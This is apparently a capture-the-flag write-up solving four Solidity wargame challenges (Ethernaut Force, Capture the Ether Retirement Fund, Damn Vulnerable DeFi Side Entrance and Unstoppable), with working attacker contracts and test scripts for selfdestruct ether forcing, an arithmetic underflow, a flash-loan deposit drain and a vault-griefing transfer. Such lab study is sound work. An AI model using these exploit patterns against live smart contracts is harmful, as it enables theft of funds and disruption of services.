### Ethernaut #7 Force

There is an empty contract called Force, and the objective of this exercise is to make the contract have a non-zero balance.  We cannot send to the contract directly to the contract because it has no receive() or fallback methods.  We can however create a self-destructing contract to send the remaining ether.  

```Java
contract Attacker {
    function attack(address payable victimAdd) payable external {
        require(msg.value > 0, "need to send ETH for attack");
        selfdestruct(victimAdd);
    }
}
```

### Capture the Ether Retirement fund 

The given contract is meant to force someone to save for retirement.  What it does is lock up Ether for 10 years, and if any is withdrawn 10% will be sent to a beneficiary.  It is not explicitly stated what is the objective of this challenge.  I beleive it is to remove the ether without incuring a penalty.  

Let's look at the collectPenalty() method.  

```Java
    function collectPenalty() public {
        require(msg.sender == beneficiary);

        uint256 withdrawn = startBalance - address(this).balance;

        // an early withdrawal occurred
        require(withdrawn > 0);

        // penalty is what's left
        msg.sender.transfer(address(this).balance);
    }
```

This can only called by the beneficiary - fine, and it will revert if withdrawn is zero.  So calling this right after the contract is deployed will revert.  One thing to note is that this is written for Solidity 0.4.21, which has no overflow/underflow checks.  We can send some ether to the contract and the subtraction will cause an underflow which will make withdrawn nonzero.  

A contract to do a selfdestruct() attack is given below, it is similar to that in the previous challenge but it was written for Solidity 0.4.21.  

```Java
contract Attacker {
    function attack(address victimAdd) payable external {
        require(msg.value > 0);
        selfdestruct(victimAdd);
    }
}
```


### Damn Vulnerable Defi #4 Side Entrance

This contract is a pool that allows anyone to deposit ETH and withdraw it at any point in time.  It has 1000 ETH deposited, and is offering free flash loans using the deposited ETH.  The objective is after starting with 1 ETH in balance to take all the ETH from the pool.  The contract was written in Solidity 0.8.0.  Some relevant parts of the Pool are shown below: 

```Java
    function deposit() external payable {
        unchecked {
            balances[msg.sender] += msg.value;
        }
        emit Deposit(msg.sender, msg.value);
    }

    function flashLoan(uint256 amount) external {
        uint256 balanceBefore = address(this).balance;

        IFlashLoanEtherReceiver(msg.sender).execute{value: amount}();

        if (address(this).balance < balanceBefore)
            revert RepayFailed();
    }
```

One possible way we can attack this is to take out a flash loan and then deposit the loaned amount back to the contract.  The ```deposit()``` function will cretid the sender with the full loan value, and ```flashLoad()``` will also be satisified because the balance of the contract will be the same.  

A contract was written to exploit this vunerability.  The contract is given below.  

```Java

contract SideEntranceAttack is IFlashLoanEtherReceiver {

    SideEntranceLenderPool pool;

    constructor(address _poolAddress){
        pool = SideEntranceLenderPool(_poolAddress);
    }

    // function to remove funds from contract
    function withdraw() external {
        // send funds to msg.sender
        (bool sent,) = payable(msg.sender).call{value:address(this).balance}("");
        require(sent, "Failed to send Ether");
    }

    function attack() external {
        pool.flashLoan(1000 ether);
        pool.withdraw();
    }

    function execute() external payable {
        // call deposit() on the pool
        pool.deposit{value: msg.value}();
    }

    receive() external payable{
    }
}
```
The only other detail is that the contract needs a ```withdraw()``` method to send the stolen funds to the player.  

The Javascript to call this is given below: 

```Javascript

    it('Execution', async function () {
        /** CODE YOUR SOLUTION HERE */
        // get Attacking contract
        const AttackerFactory = await ethers.getContractFactory("SideEntranceAttack");
        const attackerContract = await AttackerFactory.connect(player).deploy(pool.address);

        // get a flash loan from the pool, this needs to be sent from an attacking contract.  
        await attackerContract.connect(player).attack();

        // widthdraw funds
        await attackerContract.connect(player).withdraw();
    });
```

### Damn Vulnerable Defi #1 Unstoppable

THis challenge is another flash loan vault. It offers free flash loans during a grace period.  The challenge is to make the vault stop offering flash loans.  The flash loan contract is quite large, however in the ```flashLoan()``` method there are a number of contiions which will cause the call to revert.  One of them is reverts with ```InvalidBalance()```.  The code for it is given below: 

```Java
if (convertToShares(totalSupply) != balanceBefore) revert InvalidBalance(); // enforce ERC4626 requirement
```

We can send some of our 10 initial tokens to the vault to cause this to fail every time.  The code below does that in the test. 

```Javascript
    it('Execution', async function () {
        /** CODE YOUR SOLUTION HERE */
        token.transfer(vault.address, INITIAL_PLAYER_TOKEN_BALANCE);
    });
```
